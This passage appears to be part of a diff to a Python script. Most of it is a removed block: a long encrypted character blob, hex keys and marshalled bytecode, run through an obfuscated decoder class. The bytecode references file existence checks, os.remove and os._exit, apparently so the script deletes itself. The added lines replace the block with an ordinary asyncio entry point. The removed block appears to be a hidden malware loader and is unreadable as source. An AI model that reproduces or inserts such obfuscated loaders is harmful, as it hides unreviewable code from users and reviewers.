\u200d乇⡨乖\u200c㑤\u200c么㑎丸㑑㐼\ufeff⡵⡚㑒㑐㑶⡳\u200b乥乨乤乄⠣⡳㑬\u200d乾乯\ufeff㑠\ufeff⠾㐲㑂\u200c⠶乻⡔\u200d乞乸\u200b㐲⠲主乍\u200c⡏\u200d⡪\u200d乴⠻⡀\u200b⡍乾乺⡴⡽㑘㐶㑖乒\u200d㑓⡤\u200c⡁⡺⡢乍⠫㑦\u200c⡎⡭\u200c乣\u200c㑋乻\u200d㑐买乊丶⠡\ufeff㑬㐱\u200c㑑\u200b⠶乍买\u200c⡪\u200d㑤乱㑃\ufeff㐹\ufeff㑹乡⠿丰㑺⡊㑚⠴\u200d乭\ufeff㑬\u200b㑥\ufeff⡇㑥㑁㑈\u200c乶㑻㑹\u200d並㑾⡡⡸\ufeff㐨㑞\ufeff乯⡀⡮乶㑤乎乀㑒\ufeff⡞乚乑㑰㐽⡷\u200d乵㑺乲㑭\u200d乕⡤㑦㑄\u200d㐩⡦㑂㑧个\ufeff㑯乍⠾㑘\u200b⠥乸严\ufeff乓串⡔\ufeff严乨\u200d㑥㐳⠸⡈㑗丣乨⠵㑂⡆㐱乻\ufeff丵乱㑢㐴\ufeff⡌\u200c两\ufeff⠪㑳⠻\ufeff⡄⡶丷\u200c⡂乾\u200b㐻\u200b㐣\u200c⡦\u200d㑄⡠⡔\u200c⡓\u200b⠱⡆\ufeff⠸⡌㐿㑢\u200b㐵\ufeff⠿\u200d乀\u200b乚中⡆⡳㐤㑫乴\u200d⠴⠿㑪両\u200b㑾\u200d⡇乷乨丷⡌⡼乸乆\u200b义\u200b乌㑻㑎㑵\u200c㑃㑊⡑\u200c㐫⡧㑈\u200d⡓\u200c㑑⠲\u200c乄⡰乫㑫\u200d乌丩乲\u200b举㐴㑧严⡐㑴乗\ufeff㑸\ufeff乖㑊\u200b乺\ufeff⠲\u200c㐣\ufeff⡩⡇㑑⡸㐴㑩乇⡀⡯\u200d㑡㑐丷㑵㐦乹乚⡔\ufeff丵乱㑽⡡\ufeff⡡\u200c⡚\u200c㐣⠹\u200b乤乎\u200c⡧严丫\u200d⡩㑚\u200d乽\u200c丼⡐\u200c㑺乣㑦中乒\u200d两丨⠩\ufeff㑴\ufeff⡢\u200c乴乍㑥㐵\ufeff㑫㑙\ufeff乊⠱\ufeff临乙\u200d乙乞並㑦㐿㑓\u200c㑇个乬乖\u200b㑾丷乲乧㑇⠿⡼\u200c丳乆㑫⡂两⡷乤㑒⠾⠣乧㑵㑄\u200c乔㐼⡁\u200d⡘乨乴乨乷\u200b乫㑒⡫⡀\u200c乴丫\u200c⡂⠿⡪\ufeff㐷⠣⡬㑗㑌㐹\u200b⡁㑱\u200c㑟⡙\ufeff丿乴両乼丱\u200d㑤\ufeff乸\u200d⡶举㐦\u200c个⡃⠻㑇㑡⠹乨么\u200d⡻丳\u200b乗\u200b㐴\u200d乸㑧\u200b丣乫㑣丩\u200b㑷⠨乒买㑁⠴中㐳\ufeff㑢临乓乨㑚\u200b丹\u200c⠵\ufeff㐥㐭\u200c乙乃㑙\u200b⡂⡨⠩么乁⡤\ufeff丽⡘㐾㑆乴严\u200c⡦\ufeff㐫\u200b个⡅\u200d⡵⠸\ufeff㐵⠨⡞\u200d㑏⠤乵\u200b乎\ufeff㐾⡧么⠩㑠\u200d⡼㑪\u200b⡉㐥⡍乙乍⠶\u200d⡭丳⡋㑣㑋㑭\u200c丫⡤\u200b㑍㑻\u200b⠭㑢⡮\u200b㑒㑋㐰\u200d丼\u200b乲⠳㐳乓\u200c㑎⡧\u200b㑬乍乘\u200b㑸㐷么⡤乭⠫乼㐻㑰乂⡋乸\u200d㑰\u200d乵㑯乓⠡串⡼⡮乮㑶\u200d乘㐻\u200d㑻㐫⡂⠱\u200b㑯㑁㑃乻㑟\ufeff⠫⠸\u200c乸⡾丽乭乺⡖书\u200b㐩乫丸㑽\u200b⡄㑡丱乻⡣\u200c⠲\u200b么\u200b㑨⡍\u200b㑭⡭\u200d乧\u200d乂\ufeff㑍\u200c临\u200c中\u200d⡱乢⡳㑩乂\u200d㑦丫\ufeff买\u200b㑷\u200d⡽乺丱\u200c乚⡴⡏㐤㑔\ufeff⡁㑡乎⡚㑲\u200c⡙\u200d㑣㑋⡨⠹丸\u200c乯⡲丸\u200d⡭㑬\u200c㐵\u200c㐸㑖\ufeff㑚㐪㑽㑙\u200d乭乼⡉\ufeff串㑱㑇⠻\ufeff⡥㐪丷\u200c乗㐽乣\u200d㑵\u200c㑌\ufeff㑂\u200b乁\u200d㑰乘乑\ufeff丳乒⠣丹久⡁㐷㑾⡫\u200d㑶\ufeff㑕\ufeff㐴\u200c㑭㐴⠩乬\u200c㑶丷\u200c主\u200c严㐫\u200d㐼\u200d㑉\u200b⠵乔\u200c乧\u200c⠼⡡么⠦\ufeff乘乍乬\u200d乬⡻⠾乶丿㑔㐰乨乐⡕⡬\u200c㑘㐳\u200d⡸⠭並举㑖㑓\u200c㑾\u200d㑫㐪\u200b乘⡉\u200d㑵㑺\ufeff丫\u200c⡂⡖㑍㐥㑅⡟㐿㐶乳习㑃⠨\u200d㑎㑉⠽⡸\u200c严⡎乫\u200d⡯㑩⡍⡹⠽㐦⡐\ufeff㑄㐼㑤⠴\u200b㑗\u200c乊⡸\u200c⡨乳⡤\u200c⠥乸\u200b㐤⠥丰⡴丣㐴⡂㑏㑟㑒㑷丽㑞\ufeff丸⡩㐥㑯㑏\u200b么㑊\u200c⡆\u200c义丷㑾㐵㑼⡶乐乊\ufeff㑮㑩㑈乙\ufeff⠡㑪⡼㑀乳书乎乳\u200c㑠\u200c⡮⡘⠦⠽\u200b㑸\u200b乞乎乷\u200c⡀㑆⡩\u200c⠨⡫丸\u200d乬\u200b㑋㐷⡅⡯⡩\u200b㑉\u200b习㑐\u200b⡶\u200c㑣㐦⡁⡲乑\u200b⠨㐰㐶⡁丩\u200b⡶乐㐰⡍\u200b⡻⡷乷⡒\ufeff久乓丱主⠿⡮\u200c㑏⡽乧⡔丰㑘\u200b⠾\u200d⡁㐼乊⡷⠦乫⡠乍㑥並乢\u200d㑩乼\u200b⡵⠱乓\ufeff么乍⡫丳\u200b㐾⡞⡉㑢丿㑔㐷⡎㑾⡫\u200c乢⡺㐾⠲乊乌丼㑖⡸\u200c⡫乻⡯\u200b乮丸\ufeff丵\ufeff㐦㑞㐫\u200d㑆⡬㑹㑋⠷\u200c乺㑹⡏\u200c乭㐼乨\u200d乢\u200d㑬严⠽\u200c⡍\u200b⡕⡁㑟\ufeff㐻乯⡎⡍⡑\ufeff㑄⡕⡋⡊㑢㑗\u200d⡓之⡹久\u200c乖\u200c乤㑘\u200d⠤乲丩並⡺⡣\u200b㑾\u200d乁⡮㑬久乎㑦\u200d㑭㐸㑶乞⡘㑸㑁\ufeff⡅⠨\u200c㑀\u200c⠩\u200b乾乘㑶⡏\u200b习\u200c⡠⡪⠤㐡⠰\u200b⠥㑐㐰乑⡹⡚\u200d⡐⠴串㑤\u200c丶\ufeff㑌㑞乬\u200d乸⡁㑊㑎乾主㐷㑺⡚乗⠸\u200c⡅\u200b⡠久乨㐫\ufeff丽\u200c乁⡊\ufeff乌⡷㑵乃㐱\u200b临\u200d㑚㑦\u200d㑐丼\u200d㐾⡨\ufeff⡹⠿⡘乆\u200d⡩乶乚㐡⡔㑕⡶乺⡽\u200c⡮㑢\u200c㑷㐨⡄乇㑫么乘\u200d⡼\u200d㐫乭⡶㑮㑐⡓⡇乂\u200c乥买\u200c㐫⡩\u200c⡊丨⡋⡵乸么\u200d乊\u200d㐰㐶⡱㑖\u200c㑵㐽㑼乧\ufeff㑽\u200c⡤並乁⡵乗⡬㑌⠸\u200d⡌⠻㑲乣㐽乱㑋\u200b丽㑁\u200d乧㑃㐼⡠\u200c㑉㑖严举\ufeff乮㑂么\u200c⡁\u200c⡗\u200b乖\u200d㑟\u200b㑫⡷㑤㑵⡰\ufeff⠭⠲⡓㑌乁㐰乒丶⡎串\ufeff㑢㑬㑼\u200b乡㑕㑃\u200b㐦\u200b㐶\u200b㑙⡞乍⡮\u200c么㑹㑺⡖乀乥乏⠷\u200d丽㑥㑩乎⠰乥\u200b乭乒⡗㐿\ufeff㑊⡺举乐乫⡂⠼\ufeff⠼\u200c⡬严㐸㑋㑗⠶乂\u200c丸\u200d㑏⡃乳\ufeff⡎⡏\u200b㑳㑅乕㑐乳\u200c㑡㐹㐭㐽乄中⡞㑖\u200d乺⡨⠶乌㐴㑣㑮乭乒㑩乼⡾乙⡩\ufeff㐲\u200d⠶㑃㑎⡨㐥\ufeff㐨\u200b⠦㐽㑀\u200b之\u200b丨乂串\u200d㑾⠼⡢\u200c丿\u200b乍\ufeff乻\ufeff乭\u200d乼\ufeff⡔㑨丿⡏⡧㑓\u200d乡㑕乞㑴\u200c⠲㑋乡丷\ufeff㐰⠳㐶买並\u200d㐣中⡇\ufeff㑨\u200c㐫\u200c乢乫丵\u200d⡬\ufeff举⠵丣\u200b㑄\u200b㐤乩\u200d⡋㐷㑓㑭\ufeff乁\u200d㑻\u200b⡟乁乕⡷乸⡨乼丱㑋⡰⡷⠱\ufeff丨\u200c⠩乮乂乩⡰㑗\u200b㑇\u200d⡙\u200c丰⡼\u200b⠥⡊\u200d丱\u200c㑙\ufeff乙个乕⡧丨⡠㑇⠨⡯\u200d⡟乄么\u200d乌⠴\ufeff乽⡠\ufeff⠵\u200c乘⡰㑰㑷\u200b⡵⡭㐴⡆\u200c丵\u200c㑘㑘乞⠫㑍㑳\u200b⡈㑚㐲⠦⡘\ufeff⡶㑇㑺㐶⡴⠥㑂个乪⡷\u200b⡔㑾㑤㑂\ufeff⠱㑅乎\u200d㑪㑸㐦乻乴\ufeff丷乘主\u200d⡯\u200d㑼㑂㐶⡕乧\u200d⡙乹\u200d㑰\u200d乃⡞\u200d⡳⡳乓久举両丳㑙㑕㑎㑰㑪丣㐣乌\u200b⡞㑇丱\u200c⡵㑧丵⠫乴⠱\u200b乌⡟\u200b⠿㑕乧乆⡕⡀乴⡑\ufeff丷⡵\u200c㑯⠸乖义⡔㑴㐪㑵㑁乥㑟⠿⡵㑎\u200c㑇㑪\u200c乨⠩㐰⡫\u200b㑡⠻\u200b⡈\ufeff⡁乐\ufeff㑯丷⡪⡙\u200d㑫\u200b⡤⡩\ufeff㐸⡨也⠴\u200c乥\ufeff乤丣丸乽乄⡖⠭㑗⡃⠸⠽乚\u200d丼\u200b㑮\ufeff乀\ufeff乬临乑⡚㐩乻⡭⡨\ufeff㐴丼\u200b么乇⠨\u200b㑫\u200c㑃乬㑺㐪义㐱⡊\ufeff㑤㑔\u200c乷\u200b乙\u200d㑨⡏⡠丳㑤乑乲\u200d乌丸㑇㑗㐳\u200b⡟\ufeff⠶丶\ufeff⡷乼㑼乓买习⡔㑟㑻⡏\u200d⡲㑱⡾⡠⡆么⠷乊⡞\u200b乹㐰丼㑌乴\ufeff㑍\u200b㐶⠨\u200c⡉丶㑈㐡㐾㑋\ufeff⡸\u200c㑥⡊\u200b㐳主⡖⡢⡵乆㑹㑭\ufeff⠡⠤\ufeff久㑋⡞乵⠵乵㐰㑍\u200d乭㑞\ufeff㑒⠲⠿乫\u200c㑠⡕㑀乳⡔㑊\ufeff⠹\u200b乇乳\ufeff㑋乍\u200c乗乒㑳\u200c㑊⡄㑥\ufeff乞\ufeff⡑⠪乤丿丸乾㑟\u200d乩⡣⠻\ufeff㑹\u200c㑰⡱丸\u200b⡴\ufeff乍㑊乼丰乱㑁⡺⣄⠩⢄⠌⠥⣪⡭⡫⢮⢘⡺⣆⣋⣁⣀⡹⢢⠱⠥⡙⡐⠬⡤⢜⢒⡎⢥⣓⠍⡼⠁⠶⢼⣬⠻⠽⡰⠕⠧⢠⠿⢚⣟⣎⡰⠬⡚⢽⠲⠂'
-    _k = ['b83f4cf41fb43d2dbfbe83c582632276e9cc1fb782dbcc4563eb53017212e45320fd218474319281adbc7e381145b1b7d1b13a6df1353c074a363a370bc4a9e0', 'bee149c7799d3f59727cc4ae9397b6d770509f12f7d8ffbade93f8751458f5b7d771eb8f307e7dca94c22355898178b8fe6defbcd21bc014f4294ad8772afea3', '598b95d612e4c547755b3dc684fe4eda4732764249c8c05802d53739b0a02fb8180431a5d56b539a7d8766ca57d7ff0157c317f2ce6896a24bbc8d0431593fec', '7821d87d22cb2dc45622915da39c8fadb9fd2e3ae814141a43f5f353968a054d04553ffb562cbf89b84870a3531504b6893b49cf436d1cab723c77e359095139', '08272a636356ae691733e995c82fb66790e1a157735adf505de46855a0ad5deb6c99ff272d1ebabf2c59915e2e0abd087d5a7f7069cdc94c3628d68c0549d192']
-    _p = b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xf3\xc2\x00\x00\x00\x95\x00S\x00S\x01K\x00r\x00S\x00S\x01K\x01r\x01\x1e\x00S\x02\\\x02"\x005\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00a2\x00\x00\\\x00R\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x055\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00a\x12\x00\x00\\\x00R\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00\\\x055\x01\x00\x00\x00\x00\x00\x00 \x00\\\x00R\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x005\x01\x00\x00\x00\x00\x00\x00 \x00g\x01!\x00 \x00\x1f\x00N\x17=\x03\x1f\x00f\x01)\x03\xe9\x00\x00\x00\x00N\xda\x08__file__)\x08\xda\x02os\xda\x03sys\xda\x07globals\xda\x04path\xda\x06existsr\x02\x00\x00\x00\xda\x06remove\xda\x05_exit\xa9\x00\xf3\x00\x00\x00\x00\xda\x08<string>\xda\x08<module>r\r\x00\x00\x00\x01\x00\x00\x00sI\x00\x00\x00\xf0\x03\x01\x01\x01\xe7\x00\x0e\xf0\x02\x03\x01\r\xd8\x07\x11\x91W\x93Y\xd3\x07\x1e\xa02\xa77\xa17\xa7>\xa1>\xb0(\xd7#;\xd1#;\xd8\x08\n\x8f\t\x8a\t\x90(\xd4\x08\x1b\xe0\x00\x02\x87\x08\x82\x08\x88\x11\x85\x0b\xf8\xf0\x03\x00\x01\r\x89\x04\xfas\x0b\x00\x00\x00\x8a=A\x1a\x00\xc1\x1a\x02A\x1e\x03'
-    __샮뎄펎뿪깭댶__(_d, _k, _p).젻뽚괘쭟깩핬뗛꿅()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{C.R}[!] Program kullanıcı tarafından zorla durduruldu.{C.X}")
+        sys.exit(0)
